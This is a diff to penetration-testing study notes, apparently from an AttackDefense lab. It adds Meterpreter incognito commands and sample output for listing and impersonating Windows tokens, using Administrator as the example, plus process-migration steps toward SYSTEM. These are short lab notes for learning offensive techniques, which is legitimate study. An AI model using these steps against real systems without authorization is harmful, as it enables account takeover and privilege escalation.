@@ -44,7 +44,18 @@ Note: if you have a valid user credential you can authenticate in windows target
   
 - With msfconsole: `load incognito`
 - `list_tokens -u`
+  - ```
+     Delegation Tokens Available
+     ========================================
+     ATTACKDEFENSE\Administrator
+     NT AUTHORITY\LOCAL SERVICE
+     
+     Impersonation Tokens Available
+     ========================================
+     No tokens available
+    ```
 - `impersonate_token <token_name>`
+  - `impersonate_token ATTACKDEFENSE\\Administrator` **NOTE: the two backslashes**
 - You may need to migrate process to a \<user> process
   - Ex. `getpid` : 2628, `ps` :
     |PID  | PPID | Name | Arch | Session | User | Path|
@@ -52,7 +63,7 @@ Note: if you have a valid user credential you can authenticate in windows target
     |2628 | 4780 | WHAYQtsbkO.exe |  | 1 | | |
     |... | ... | ... | ... | ... | ... | ... |
     |2948 | 2036 | explorer.exe | X64 | 1 | ATTACKDEFENSE\Administrator | C:\Windows\explorer.exe |
-- `getpid 2948`
+- `getpid` : 2948
 - Of course you can repeat the process to become NT AUTHORITY\SYSTEM
 
 <br><br>
